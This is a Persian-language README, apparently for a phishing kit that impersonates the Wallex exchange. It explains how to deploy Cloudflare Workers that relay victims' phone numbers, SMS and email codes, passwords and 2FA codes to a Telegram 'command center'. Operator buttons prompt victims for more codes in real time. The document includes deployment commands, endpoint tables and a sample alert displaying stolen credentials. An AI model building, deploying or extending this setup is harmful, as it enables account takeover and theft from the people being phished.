# Cloudflare Workers Telegram System

تمام عملکرد Telegram bot حالا به Cloudflare Workers منتقل شده است. این سیستم جدید ارائه می‌دهد:

## مزایای Worker System

✅ **Performance بهتر** - Workers در edge اجرا می‌شوند  
✅ **Scalability خودکار** - بدون نیاز به مدیریت سرور  
✅ **Cost-effective** - تا 100,000 requests/day رایگان  
✅ **Global presence** - کارکرد سریع در سراسر جهان  
✅ **Zero maintenance** - بدون نیاز به نگهداری سرور

## معماری جدید

```
Frontend (React)
    ↕️
Workers (Cloudflare)
    ↕���
Telegram Bot API
```

### Components

1. **Main Telegram Worker** (`telegram-bot-worker.js`)

   - ارسال پیام‌ها به Telegram
   - مدیریت session ها
   - فرمت کردن پیام‌های حرفه‌ای
   - مدیریت دکمه‌های ادمین

2. **Callback Worker** (`telegram-callback-worker.js`)

   - Polling برای پاسخ‌های ادمین
   - مدیریت callback های دکمه‌ها
   - ذخیره و بازیابی اقدامات ادمین

3. **Frontend Services**
   - `telegram-service-worker.ts` - اتصال به main worker
   - `telegram-callback-service-worker.ts` - اتصال به callback worker

## راه‌اندازی سریع

### 1. نصب Wrangler CLI

```bash
npm install -g wrangler
wrangler auth login
```

### 2. تنظیم متغیرهای محیطی

```bash
cd workers

# تنظیم token bot
wrangler secret put TELEGRAM_BOT_TOKEN_ENV
# وقتی prompt می‌شود، token bot رو وارد کنید

# تنظیم chat ID
wrangler secret put TELEGRAM_CHAT_ID_ENV
# وقتی prompt می‌شود، chat ID رو وارد کنید
```

### 3. Deploy Workers

```bash
# استفاده از npm script
npm run worker:deploy

# یا manual:
cd workers
wrangler publish telegram-bot-worker.js --name wallex-telegram-bot
wrangler publish telegram-callback-worker.js --name wallex-telegram-callback
```

### 4. بروزرسانی Frontend

فایل `.env` را بروزرسانی کنید:

```bash
# URLs واقعی Worker هایتان را وارد کنید
VITE_WORKER_BASE_URL=https://wallex-telegram-bot.your-subdomain.workers.dev
VITE_CALLBACK_WORKER_URL=https://wallex-telegram-callback.your-subdomain.workers.dev
```

## ویژگی‌های فعلی

### ✅ کاملاً پیاده‌سازی شده

- ✅ ارسال شماره تلفن به Telegram
- ✅ مدیریت کدهای تأیید (SMS, Email, 2FA, Password)
- ✅ فرمت حرفه‌ای پیام‌ها با grouping کدها
- ✅ دکمه‌های ادمین (Password, 2FA, Email, Wrong buttons)
- ✅ Real-time activity tracking (آنلاین/آفلاین)
- ✅ Session management کامل
- ✅ Professional message formatting
- ✅ Rate limiting و optimization
- ✅ Error handling و retry logic
- ✅ CORS support برای frontend
- ✅ Callback polling برای پاسخ‌های ادمین

### 📱 نمونه پیام Telegram

```
🟡 WALLEX AUTH PENDING 📋
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
📱 +98901234567
🕐 12/25 14:30 • 2m 15s
🟢 ACTIVE • 5s

🔐 AUTHENTICATION DATA:
Phone/SMS: 1.123456 - 2.789456
Email: user@example.com
Email Code: 1.abc123
Password: 1.mypass123
2FA Code: 1.789123

🆔 Session: abc1234567

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
🔐 WALLEX COMMAND CENTER
```

## API Endpoints

### Main Worker Endpoints

| Endpoint          | Method | توضیحات                    |
| ----------------- | ------ | -------------------------- |
| `/send-phone`     | POST   | ارسال شماره تلفن           |
| `/update-session` | POST   | بروزرسانی session          |
| `/update-status`  | POST   | بروزرسانی وضعیت آنلاین     |
| `/send-custom`    | POST   | ارسال پیام دلخواه          |
| `/update-custom`  | POST   | بروزرسانی پیام دلخواه      |
| `/webhook`        | POST   | دریافت webhook از Telegram |

### Callback Worker Endpoints

| Endpoint          | Method | توضیحات                    |
| ----------------- | ------ | -------------------------- |
| `/poll-callback`  | GET    | چک کردن callback های ادمین |
| `/clear-callback` | POST   | پاک کردن callback          |
| `/store-callback` | POST   | ذخیره callback جدید        |

## Development و Testing

### Local Development

```bash
# اجرای worker به صورت local
npm run worker:dev

# بروزرسانی .env برای testing local
VITE_WORKER_BASE_URL=http://localhost:8787
```

### Monitoring

```bash
# مشاهده logs به صورت real-time
npm run worker:logs

# مشاهده logs callback worker
npm run worker:logs:callback
```

### Testing Commands

```bash
# تست main worker
curl https://your-worker.your-subdomain.workers.dev/

# تست callback worker
curl https://your-callback-worker.your-subdomain.workers.dev/

# تست ارسال شماره
curl -X POST https://your-worker.your-subdomain.workers.dev/send-phone \
  -H "Content-Type: application/json" \
  -d '{"phoneNumber": "+989123456789"}'
```

## Migration از Legacy System

سیستم جدید به عنوان drop-in replacement طراحی شده:

### قبل از Migration:

```typescript
// استفاده از services قدیمی
import { ... } from "@/lib/telegram-service-enhanced";
import { ... } from "@/lib/telegram-callback-service";
```

### بعد از Migration:

```typescript
// استفاده از Worker services
import { ... } from "@/lib/telegram-service-worker";
import { ... } from "@/lib/telegram-callback-service-worker";
```

تمام function ها همان API را دارند، فقط implementation داخلی تغییر کرده.

## Troubleshooting

### مشکلات رایج

**❌ Worker returns 500**

```bash
# بررسی logs
npm run worker:logs
```

**❌ Environment variables not set**

```bash
# دوباره تنظیم کنید
wrangler secret put TELEGRAM_BOT_TOKEN_ENV
wrangler secret put TELEGRAM_CHAT_ID_ENV
```

**❌ CORS errors**

```bash
# مطمئن شوید URLs frontend با Worker URLs مطابقت دارند
```

**❌ Telegram not responding**

```bash
# بررسی bot token و chat ID
curl "https://api.telegram.org/bot<TOKEN>/getMe"
```

### Debug Mode

برای debug بهتر، می‌تونید logs مفصل رو فعال کنید:

```javascript
// در worker code
console.log("Debug info:", { sessionId, action, timestamp });
```

## Performance و Scaling

### Current Limits

- **Free tier**: 100,000 requests/day
- **Memory**: 128MB per worker
- **CPU time**: 10-30 seconds per request

### Optimization Features

- ✅ Rate limiting intelligent
- ✅ Message deduplication
- ✅ Session cleanup خودکار
- ✅ Exponential backoff for errors
- ✅ Connection pooling برای Telegram API

## Security

### مزایای امنیتی Workers

- 🔒 **Environment variables امن** - secrets در Cloudflare encrypted ذخیره می‌شوند
- 🔒 **HTTPS by default** - تمام ارتباطات encrypted
- 🔒 **No server management** - بدون نگرانی security patches
- 🔒 **DDoS protection** - Cloudflare محافظت خودکار

### Best Practices

1. **هرگز secrets را در code commit نکنید**
2. **از wrangler secret برای environment variables استفاده کنید**
3. **CORS را درست تنظیم کنید**
4. **Rate limiting را فعال نگه دارید**

## Next Steps

برای بهبود بیشتر می‌تونید:

1. **KV Storage** اضافه کنید برای persistent sessions
2. **Durable Objects** برای real-time features
3. **Custom domain** برای professional URLs
4. **Analytics** برای monitoring بهتر

## Support

اگر مشکلی داشتید:

1. **Logs رو بررسی کنید**: `npm run worker:logs`
2. **Environment variables رو چک کنید**
3. **CORS و URLs رو verify کنید**
4. **Telegram bot token رو test کنید**

سیستم جدید عملکرد قبلی رو حفظ می‌کنه اما با performance و reliability بهتر!
